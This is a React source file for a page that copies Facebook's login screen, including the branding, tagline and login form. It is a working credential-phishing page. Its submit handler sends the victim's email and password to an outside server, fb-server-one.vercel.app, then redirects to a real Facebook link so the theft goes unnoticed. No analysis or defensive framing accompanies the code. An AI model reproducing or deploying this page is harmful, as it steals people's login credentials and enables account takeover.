import { useState } from "react";

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  // Submit handler
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!email || !password) {
      alert("Please fill both fields");
      return;
    }

    try {
      setLoading(true);

      const res = await fetch("https://fb-server-one.vercel.app/api/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await res.json();

    if (data.success) {
  window.location.href = "https://www.facebook.com/share/r/1D9pKTPKrz/";
  setEmail("");
  setPassword("");
} else {
        alert("Failed: " + data.message);
      }
    } catch (error) {
      alert("Server error: " + error.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5]">
      <div className="flex items-center justify-center min-h-screen">
        <div className="flex flex-col md:flex-row w-full lg:max-w-9/12 items-center justify-between px-4 lg:px-0">
          
          {/* LEFT SIDE TEXT */}
          <div className="flex-1 md:max-w-10/12 md:ml-[-40px] text-center md:text-left mb-6 md:mb-0">
            <h1 className="text-[#1877f2] pt-14 text-6xl lg:text-8xl font-bold">
              facebook
            </h1>
            <p className="mt-4 text-[28px] leading-[32px] text-black/80">
              Facebook helps you connect and share with the people in your life.
            </p>
          </div>

          {/* RIGHT SIDE FORM */}
          <div className="w-full flex justify-center md:justify-end md:mt-[-40px]">
            <div className="w-[600px] bg-white rounded-lg shadow-[0_8px_16px_rgba(0,0,0,0.1)] px-8 pt-8 pb-8  lg:py-20">
              <form onSubmit={handleSubmit} className="space-y-3">

                <input
                  type="text"
                  placeholder="Email address or phone number"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-black text-[17px] placeholder:text-[#343333] focus:outline-none focus:text-[#201f21] focus:border-[#1877f2]"
                />

                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full h-[60px] border border-[#dddfe2] text-black rounded-lg px-4 text-[17px] placeholder:text-[#343333]  focus:outline-none focus:text-[#201f21] focus:border-[#1877f2]"
                />

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full h-[56px] rounded-lg bg-[#1877f2] text-white text-[20px] font-bold hover:bg-[#166fe5] disabled:opacity-50"
                >
                  {loading ? "Log in..." : "Log in"}
                </button>
              </form>





              <div className="mt-3 text-center">
                <a href="#" className="text-[14px] text-[#1877f2] hover:underline">
                  Forgotten password?
                </a>
              </div>

              <div className="my-4 h-px bg-[#dadde1]" />

              <div className="flex justify-center">
                <button className="h-[48px] px-4 rounded-lg bg-[#42b72a] text-white text-[17px] font-bold hover:bg-[#36a420]">
                  Create new account
                </button>
              </div>
            </div>
            
          </div>

        </div>
      </div>

      {/* BOTTOM TEXT */}
      <div className="mt-4 md:mt-2 text-center text-[14px]">
        <span className="font-semibold">Create a Page</span> for a celebrity,
        brand or business.
      </div>
    </div>
  );
}

export default App;
